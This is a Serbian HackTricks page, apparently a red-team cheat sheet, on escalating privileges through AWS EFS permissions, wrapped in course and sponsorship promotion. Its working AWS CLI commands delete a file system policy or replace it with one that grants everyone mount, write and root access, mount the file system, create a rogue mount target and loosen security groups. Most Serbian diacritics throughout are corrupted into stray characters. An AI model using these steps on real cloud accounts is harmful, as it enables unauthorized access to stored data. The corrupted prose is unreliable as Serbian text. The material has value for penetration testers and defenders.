# AWS - EFS Privesc

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## EFS

Vi코e **informacija o EFS-u** mo쬰te prona캖i u:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Zapamtite da biste montirali EFS, morate biti u podmre쬴 gde je EFS izlo쬰n i imati pristup njemu (sigurnosne grupe). Ako se to de코ava, prema podrazumevanim pode코avanjima uvek 캖ete mo캖i da ga montirate, me캠utim, ako je za코ti캖en IAM politikama, morate imati dodatne dozvole koje su ovde navedene da biste mu pristupili.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Sa bilo kojom od ovih dozvola, napada캜 mo쬰 **promeniti politiku fajl sistema** kako bi vam dao pristup, ili jednostavno je **obrisati** kako bi se dodelio **podrazumevani pristup**.

Da biste obrisali politiku:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Da biste to promenili:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Sa ovla코캖enjem, napada캜 캖e mo캖i da **montira EFS**. Ako dozvola za pisanje nije podrazumevano dodeljena svima koji mogu da montiraju EFS, on 캖e imati samo **pristup za 캜itanje**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Dodatne dozvole `elasticfilesystem:ClientRootAccess` i `elasticfilesystem:ClientWrite` mogu se koristiti za **pisanje** unutar fajl sistema nakon 코to je montiran i za **pristup** tom fajl sistemu **kao root**.

**Potencijalni uticaj:** Indirektno pove캖anje privilegija pronala쬰njem osetljivih informacija u fajl sistemu.

### `elasticfilesystem:CreateMountTarget`

Ako napada캜 se nalazi unutar **podmre쬰** gde **ne postoji mount target** za EFS, on jednostavno mo쬰 **kreirati jedan u svojoj podmre쬴** sa ovom privilegijom:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potencijalni uticaj:** Indirektno pove캖anje privilegija pronala쬰njem osetljivih informacija u fajl sistemu.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

U scenariju gde napada캜 otkrije da EFS ima monta쬹u ta캜ku u svojoj podmre쬴, ali **nijedna sigurnosna grupa ne dozvoljava saobra캖aj**, on jednostavno mo쬰 **promeniti to modifikuju캖i odabrane sigurnosne grupe**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potencijalni uticaj:** Indirektno pove캖anje privilegija pronala쬰njem osetljivih informacija u fajl sistemu.



<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
